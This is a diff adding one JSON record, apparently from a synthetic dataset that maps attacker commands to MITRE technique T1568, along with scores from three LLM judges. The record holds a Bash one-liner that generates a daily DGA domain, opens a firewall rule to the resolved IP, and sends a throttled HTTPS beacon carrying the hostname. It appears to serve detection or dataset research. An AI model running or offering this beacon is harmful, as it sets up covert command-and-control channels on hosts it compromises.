@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1568",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "bash -c 'd=$(date -u +%Y%m%d | sha256sum | cut -c1-12).cdn-updater.org; ans=$(dig +nocmd +noall +answer \"$d\" A | head -n1); ip=$(awk \"{print $5}\" <<<\"$ans\"); ttl=$(awk \"{print $2}\" <<<\"$ans\"); [ -n \"$ip\" ] && { iptables -D OUTPUT -p tcp -d \"$ip\" --dport 443 -j ACCEPT 2>/dev/null; iptables -I OUTPUT -p tcp -d \"$ip\" --dport 443 -j ACCEPT; curl -fsS --speed-time 2 --speed-limit 10 \"https://$d:443/ping?ttl=$ttl&host=$(hostname)\"; }'",
+  "explanation": "Resolves a DGA domain and extracts the TTL to time communications. It updates iptables to allow outbound 443 to the resolved IP and beacons with rate controls to appear irregular yet benign.",
+  "rationale_steps": [
+    "Create a daily DGA domain",
+    "Resolve A record and parse IP and TTL",
+    "Refresh iptables rule to target the current resolved IP",
+    "Beacon over HTTPS with throttled traffic to blend in"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1568-10f87baa-b1a03cd9",
+  "source_prompt_hash": "10f87baa",
+  "timestamp_utc": "2025-09-30T09:41:35.067898Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper command separators, valid flag formats, and appropriate variable usage throughout the bash one-liner.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly implements T1568 (Dynamic Resolution) by using a date-based DGA algorithm to generate domains, extracting DNS TTL values, establishing firewall rules for the resolved IP, and creating a beaconing mechanism that appears benign.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T04:57:45.779891Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper command separators, valid flags, and correct variable and command substitutions throughout.",
+        "semantic_score": 3,
+        "semantic_justification": "While the DGA resolution and beaconing aspects are perfectly aligned with T1568, the `iptables` commands explicitly mentioned in the intent will fail due to the specified 'Privilege: None' privilege level.",
+        "combined_score": 4.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T04:58:08.115521Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed Bash with balanced quoting/braces, valid operators, and parseable flags.",
+        "semantic_score": 3,
+        "semantic_justification": "Implements DGA-based domain generation and beacons to it (aligning with T1568), but awk\u2019s \"$5/$2\" are expanded by the shell breaking IP/TTL extraction and iptables changes require root, reducing operational plausibility.",
+        "combined_score": 4.0,
+        "confidence": 0.8,
+        "timestamp": "2025-10-02T04:58:31.111664Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 3.667,
+    "llm_average_score": 4.333,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
